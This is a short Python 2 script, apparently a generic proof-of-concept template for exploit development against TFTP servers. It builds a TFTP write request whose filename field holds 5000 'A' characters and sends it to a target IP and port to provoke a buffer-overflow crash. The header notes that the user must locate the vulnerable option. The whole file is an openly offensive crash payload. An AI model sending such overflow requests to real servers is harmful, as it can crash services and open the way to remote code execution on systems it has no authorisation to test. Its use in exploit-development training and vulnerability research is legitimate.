#!/usr/bin/python
''' 
Content:	exploitDev PoC template for TFTP targets
Author: 	Florian Hansemann | @HanseSecure | https://hansesecure.de
Date: 		02/2018
	
Usage:		python tftp.py targetIP targetPort
Note:		This is just a generic template, you have to find the vulnerable option by yourself and change the position of crash
		
'''
 
import socket
import sys
 
if len(sys.argv) != 3:
	print "Usage: python tftp.py targetIP targetPort"
else:
	ip = sys.argv[1]
	port = int(sys.argv[2])
 
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
	except:
		print "socket() failed"
		sys.exit(1)
 

 
	filename = "A"*5000
 
	mode = "netascii"
 
	evil = "\x00\x02" + filename + "\x00" + mode + "\x00"
 	print "[*] Sending evil tftp request to target"
	s.sendto(evil, (ip, port))
